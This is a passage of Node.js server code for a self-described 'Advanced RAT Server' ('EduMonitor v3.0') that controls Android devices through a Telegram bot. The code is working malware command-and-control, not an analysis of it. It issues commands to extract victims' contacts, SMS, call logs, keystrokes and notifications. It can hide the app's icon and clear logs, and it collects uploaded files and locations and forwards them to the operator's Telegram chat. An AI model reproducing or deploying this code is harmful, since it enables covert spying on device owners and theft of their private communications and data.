            editMessageText(chatId, messageId,
                `❌ *Failed to list files*\n\nError: ${error || 'Access denied'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function getContacts(chatId, messageId, deviceId, format) {
    await editMessageText(chatId, messageId,
        `📇 *Extracting Contacts*\n\nFormat: ${format.toUpperCase()}\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, `get_contacts_${format}`, {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `✅ *Contacts extracted successfully!*\n\nFile will be uploaded shortly.`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Extraction Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function getSMS(chatId, messageId, deviceId, format) {
    await editMessageText(chatId, messageId,
        `💬 *Extracting SMS*\n\nFormat: ${format.toUpperCase()}\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, `get_sms_${format}`, {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `✅ *SMS extracted successfully!*\n\nFile will be uploaded shortly.`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Extraction Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function getCallLogs(chatId, messageId, deviceId, format) {
    await editMessageText(chatId, messageId,
        `📞 *Extracting Call Logs*\n\nFormat: ${format.toUpperCase()}\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, `get_calllogs_${format}`, {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `✅ *Call logs extracted successfully!*\n\nFile will be uploaded shortly.`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Extraction Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function getApps(chatId, messageId, deviceId, format) {
    await editMessageText(chatId, messageId,
        `📱 *Extracting Installed Apps*\n\nFormat: ${format.toUpperCase()}\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, `get_apps_${format}`, {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `✅ *Apps extracted successfully!*\n\nFile will be uploaded shortly.`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Extraction Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function getKeystrokes(chatId, messageId, deviceId, format) {
    await editMessageText(chatId, messageId,
        `⌨️ *Extracting Keystrokes*\n\nFormat: ${format.toUpperCase()}\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, `get_keystrokes_${format}`, {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `✅ *Keystrokes extracted successfully!*\n\nFile will be uploaded shortly.`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Extraction Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function getNotifications(chatId, messageId, deviceId, format) {
    await editMessageText(chatId, messageId,
        `🔔 *Extracting Notifications*\n\nFormat: ${format.toUpperCase()}\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, `get_notifications_${format}`, {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `✅ *Notifications extracted successfully!*\n\nFile will be uploaded shortly.`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Extraction Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function getBatteryStatus(chatId, messageId, deviceId) {
    const device = deviceManager.devices.get(deviceId);
    if (!device) {
        await editMessageText(chatId, messageId,
            '❌ *Device Not Found*',
            [[{ text: '🔙 BACK', callback_data: 'menu_devices' }]]
        );
        return;
    }

    const batteryEmoji = getBatteryEmoji(device.batteryLevel);
    const message = 
        `🔋 *Battery Status - ${device.info.model}*\n\n` +
        `Level: ${batteryEmoji} ${device.batteryLevel || '?'}%\n` +
        `Last Updated: ${new Date(device.lastSeen).toLocaleString()}`;

    await editMessageText(chatId, messageId, message,
        [[{ text: '🔄 REFRESH', callback_data: `battery_${deviceId}` }, { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
    );
}

async function getNetworkInfo(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `📡 *Getting Network Info*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, 'get_network_info', {}, (success, data, error) => {
        if (success) {
            let message = `📡 *Network Info - ${deviceManager.devices.get(deviceId)?.info.model}*\n\n`;
            if (data.connected) {
                message += `Status: ✅ Connected\n`;
                message += `Type: ${data.type}\n`;
                if (data.ssid) message += `WiFi: ${data.ssid}\n`;
                if (data.ip) message += `IP: ${data.ip}\n`;
                if (data.signal) message += `Signal: ${data.signal}dBm\n`;
            } else {
                message += `Status: ❌ Disconnected\n`;
            }
            editMessageText(chatId, messageId, message,
                [[{ text: '🔄 REFRESH', callback_data: `network_${deviceId}` }, { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to get network info*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function getStorageInfo(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `💾 *Getting Storage Info*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, 'get_storage_info', {}, (success, data, error) => {
        if (success) {
            let message = `💾 *Storage Info - ${deviceManager.devices.get(deviceId)?.info.model}*\n\n`;
            if (data.internal_total) {
                message += `*Internal Storage:*\n`;
                message += `Total: ${formatFileSize(data.internal_total)}\n`;
                message += `Used: ${formatFileSize(data.internal_used)}\n`;
                message += `Free: ${formatFileSize(data.internal_free)}\n`;
                message += `Usage: ${Math.round((data.internal_used / data.internal_total) * 100)}%\n\n`;
            }
            if (data.external_total) {
                message += `*External Storage:*\n`;
                message += `Total: ${formatFileSize(data.external_total)}\n`;
                message += `Used: ${formatFileSize(data.external_used)}\n`;
                message += `Free: ${formatFileSize(data.external_free)}\n`;
                message += `Usage: ${Math.round((data.external_used / data.external_total) * 100)}%\n`;
            }
            editMessageText(chatId, messageId, message,
                [[{ text: '🔄 REFRESH', callback_data: `storage_${deviceId}` }, { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to get storage info*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function getDeviceInfo(chatId, messageId, deviceId) {
    const device = deviceManager.devices.get(deviceId);
    if (!device) {
        await editMessageText(chatId, messageId,
            '❌ *Device Not Found*',
            [[{ text: '🔙 BACK', callback_data: 'menu_devices' }]]
        );
        return;
    }

    const message = 
        `ℹ️ *Device Information*\n\n` +
        `*Model:* ${device.info.model}\n` +
        `*Android:* ${device.info.androidVersion}\n` +
        `*Manufacturer:* ${device.info.manufacturer}\n` +
        `*Device ID:* \`${device.id}\`\n` +
        `*Features:* ${device.features.join(', ') || 'Standard'}\n` +
        `*Registered:* ${new Date(device.registeredAt).toLocaleString()}\n` +
        `*Last Seen:* ${new Date(device.lastSeen).toLocaleString()}`;

    await editMessageText(chatId, messageId, message,
        [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
    );
}

async function rebootDevice(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `🔄 *Rebooting Services*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, 'reboot_services', {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `✅ *Services rebooted successfully!*`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Reboot Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function hideIcon(chatId, messageId, deviceId) {
    const result = deviceManager.sendCommand(deviceId, 'hide_icon', {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `👻 *Icon hidden successfully!*\n\nApp icon is now hidden from launcher.`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to hide icon*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function showIcon(chatId, messageId, deviceId) {
    const result = deviceManager.sendCommand(deviceId, 'show_icon', {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `👁️ *Icon shown successfully!*\n\nApp icon is now visible in launcher.`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to show icon*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function clearLogs(chatId, messageId, deviceId) {
    const result = deviceManager.sendCommand(deviceId, 'clear_logs', {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `🗑️ *Logs cleared successfully!*`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to clear logs*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

// ============================================
// UTILITY FUNCTIONS
// ============================================
function getBatteryEmoji(level) {
    if (!level) return '❓';
    if (level > 80) return '🔋';
    if (level > 50) return '⚡';
    if (level > 20) return '⚠️';
    return '🪫';
}

function formatUptime(timestamp) {
    const seconds = Math.floor((Date.now() - timestamp) / 1000);
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    
    if (days > 0) return `${days}d ${hours}h`;
    if (hours > 0) return `${hours}h ${minutes}m`;
    return `${minutes}m`;
}

function formatFileSize(bytes) {
    if (!bytes) return '0 B';
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
}

// ============================================
// API ENDPOINTS
// ============================================

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: deviceManager.devices.size,
        timestamp: Date.now()
    });
});

// Device registration (HTTP fallback)
app.post('/api/register', (req, res) => {
    const { deviceId, deviceInfo } = req.body;

    if (!deviceId) {
        return res.status(400).json({ error: 'Missing deviceId' });
    }

    // Register in memory (WebSocket will handle full registration)
    const deviceKey = encryption.generateDeviceKey();
    
    res.json({
        status: 'registered',
        deviceId,
        key: deviceKey,
        serverTime: Date.now()
    });
});

// Command polling
app.get('/api/commands/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const device = deviceManager.devices.get(deviceId);
    
    if (device?.pendingCommands?.length > 0) {
        const commands = [...device.pendingCommands];
        device.pendingCommands = [];
        res.json({ commands });
    } else {
        res.json({ commands: [] });
    }
});

// Command result
app.post('/api/result/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const { commandId, success, data, error } = req.body;

    // Forward to WebSocket handler
    handleDeviceResponse(deviceId, { commandId, success, data, error });
    
    res.sendStatus(200);
});

// File upload
app.post('/api/upload', multer({ dest: 'uploads/' }).single('file'), async (req, res) => {
    try {
        const { deviceId, type, caption } = req.body;
        const file = req.file;

        if (!deviceId || !file) {
            return res.status(400).json({ error: 'Missing fields' });
        }

        const mediaId = uuidv4();
        const fileExt = path.extname(file.originalname);
        const newPath = path.join('uploads', `${mediaId}${fileExt}`);

        fs.renameSync(file.path, newPath);

        db.run(`INSERT INTO media (id, device_id, type, file_path, size, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)`,
            [mediaId, deviceId, type, newPath, file.size, Date.now()]
        );

        // Forward to Telegram
        const device = deviceManager.devices.get(deviceId);
        if (device) {
            await sendTelegramDocument(config.telegram.chatId, newPath, file.originalname, 
                `${caption || '📎 File'} from ${device.info.model}`);
        }

        res.json({ success: true, mediaId });

    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Location endpoint
app.post('/api/location/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const locationData = req.body;

    handleDeviceLocation(deviceId, locationData);
    res.json({ success: true });
});

// ============================================
// CLEANUP JOBS
// ============================================
schedule.scheduleJob('0 0 * * *', () => {
    const cutoff = Date.now() - config.storage.retentionDays * 24 * 60 * 60 * 1000;
    
    db.all('SELECT file_path FROM media WHERE timestamp < ?', [cutoff], (err, media) => {
        if (err || !media) return;
        media.forEach(item => {
            try {
                if (item.file_path && fs.existsSync(item.file_path)) {
                    fs.unlinkSync(item.file_path);
                }
            } catch (error) {
                console.error('Cleanup error:', error);
            }
        });
    });

    db.run('DELETE FROM media WHERE timestamp < ?', [cutoff]);
    db.run('DELETE FROM locations WHERE timestamp < ?', [cutoff]);
});

// ============================================
// START SERVER
// ============================================
server.listen(config.server.port, config.server.host, () => {
    console.log('\n🚀 ===============================================');
    console.log(`🚀 EduMonitor v3.0 - Advanced RAT Server`);
    console.log(`🚀 ===============================================`);
    console.log(`\n📡 HTTP Server: http://${config.server.host}:${config.server.port}`);
    console.log(`🔌 WebSocket: ws://${config.server.host}:${config.server.port}/ws`);
    console.log(`🤖 Telegram Bot: @${config.telegram.token.split(':')[0]}`);
    console.log(`📊 Database: SQLite3 (edumonitor.db)`);
    console.log(`🔐 Encryption: AES-256-GCM`);
    console.log(`\n✅ Features Enabled:`);
    console.log(`   └─ Professional Inline Keyboards`);
    console.log(`   └─ Full Command Set (25+ commands)`);
    console.log(`   └─ Real-time Command Callbacks`);
    console.log(`   └─ WebSocket + HTTP Fallback`);
    console.log(`   └─ File Upload & Processing`);
    console.log(`   └─ Data Extraction (Contacts, SMS, etc.)`);
    console.log(`   └─ Device Management`);
    console.log(`   └─ Auto Cleanup`);
    console.log(`\n🚀 ===============================================\n`);
});

// Graceful shutdown
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

async function shutdown() {
    console.log('\n🛑 Shutting down gracefully...');
    deviceManager.broadcastToDevices({ type: 'shutdown', timestamp: Date.now() });
    wss.close();
    server.close(() => {
        db.close();
        process.exit(0);
    });
}

module.exports = { app, server, wss, deviceManager, db };
